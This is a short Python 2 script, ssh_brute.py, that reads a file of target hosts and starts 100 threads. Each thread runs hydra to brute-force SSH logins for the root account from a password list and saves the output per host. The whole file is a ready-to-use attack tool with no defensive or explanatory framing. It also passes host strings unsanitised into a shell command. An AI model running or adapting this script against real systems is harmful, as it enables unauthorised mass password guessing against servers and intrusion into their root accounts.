#!/usr/bin/env python
#coding:utf8
"""
use hydra to bruteforce ssh
python ssh_brute.py -h hosts_file -p pass_file
"""

import os
import sys
import getopt
import re
import time
import multiprocessing
import Queue
import threading


queue = Queue.Queue()

def bruteforce(queue, pass_file):
	
	while True:
		time.sleep(1)
		try:
			if queue.empty():
				break
			queue_task = queue.get()

			print 'start scan',queue_task
			start = time.clock()
		except Exception,e:
			print e
			break
		try:
			cmd = 'hydra -l root -P ' + pass_file + ' -t 8 ssh://' + queue_task
			foutput = os.popen(cmd)
			result = foutput.read()

			#save all
			output = open(queue_task+'_ssh', 'w')
			output.write(result)
			output.close()

			end = time.clock()
			print 'scan ',queue_task,'Used:',end - start

		except Exception,e:
			continue

	


def main(ip_file, pass_file):
	f = open(ip_file)
	info = []
	m_count = 100
	# while 1:
	# 	#read two lines
	# 	host = f.readline()
	# 	if not host:
	# 		break;
	# 	port = f.readline()
	# 	if not port:
	# 		break;
	# 	h = host.split()[4]
	# 	p = (port.split()[0]).split('/')[0]
	# 	info.append(h+':'+p)
	while 1:
		host = f.readline()
		if not host:
			break
		info.append(host.strip())

	for i in info:
		queue.put(i)
		#print i


	for i in range(m_count):
		t = threading.Thread(target=bruteforce, args=(queue,pass_file))
		# t.setDaemon(True)
		t.start()

		# p = multiprocessing.Process(target=bruteforce, args=())
		# 
		# p.start()
	


if __name__ == '__main__':
	ip_file = ''
	pass_file = ''
	options,args = getopt.getopt(sys.argv[1:],"h:p:")

	for opt,arg in options:
		if opt == '-h':
			ip_file = arg
		if opt == '-p':
			pass_file = arg

	if not os.path.exists(ip_file) or not os.path.exists(pass_file):
		#print '\033[1;31;40m'
		print 'python ssh_brute.py -h hosts_file -p pass_file'
		#print '\033[0m'
		sys.exit()


	main(ip_file, pass_file)
